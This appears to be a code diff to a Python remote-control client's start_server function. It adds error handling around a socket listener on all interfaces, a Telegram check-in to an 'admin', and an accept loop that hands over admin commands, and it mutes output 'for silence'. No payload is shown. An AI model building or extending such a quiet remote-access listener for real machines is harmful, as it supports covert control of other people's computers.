@@ -151,16 +151,37 @@ def start_server():
     """Start a server to listen for incoming connections from admin."""
     global server_socket, running
     
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # Allow socket to be reused immediately after it's closed
-    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    
     try:
-        server_socket.bind(('0.0.0.0', CLIENT_PORT))
-        server_socket.listen(1)
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Allow socket to be reused immediately after it's closed
+        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         
-        # Notify admin
-        notify_admin()
+        # Try binding to the port
+        try:
+            server_socket.bind(('0.0.0.0', CLIENT_PORT))
+            # print(f"Socket bound to port {CLIENT_PORT}") # Keep commented
+        except socket.error as bind_error:
+            print(f"CRITICAL ERROR: Failed to bind socket to port {CLIENT_PORT}: {bind_error}")
+            # Potentially notify admin about bind failure?
+            # send_telegram_message(f"Client {client_id} Error: Failed to bind to port {CLIENT_PORT}. Port likely in use.")
+            running = False
+            return # Exit if cannot bind
+
+        # Try listening
+        try:
+            server_socket.listen(1)
+            # print(f"Server listening on port {CLIENT_PORT}") # Keep commented
+        except socket.error as listen_error:
+            print(f"CRITICAL ERROR: Failed to listen on socket: {listen_error}")
+            running = False
+            return # Exit if cannot listen
+            
+        # Notify admin (wrapped in try...except)
+        try:
+            notify_admin()
+        except Exception as notify_error:
+            print(f"WARNING: Failed to notify admin via Telegram: {notify_error}")
+            # Continue running even if notification fails
         
         # print(f"Listening for admin connection on port {CLIENT_PORT}") # Commented out for silence
         
@@ -177,10 +198,13 @@ def start_server():
                 # Handle commands from admin
                 handle_admin_commands(client_socket)
             except Exception as e:
-                print(f"Connection error: {e}")
+                # print(f"Connection error: {e}") # Keep commented
                 time.sleep(5)  # Wait before trying to accept a new connection
-    except Exception as e:
-        print(f"Server error: {e}")
+
+    except Exception as server_setup_error: # Catch other potential setup errors
+        print(f"CRITICAL SERVER SETUP ERROR: {server_setup_error}")
+        running = False
+
     finally:
         if server_socket:
             server_socket.close()
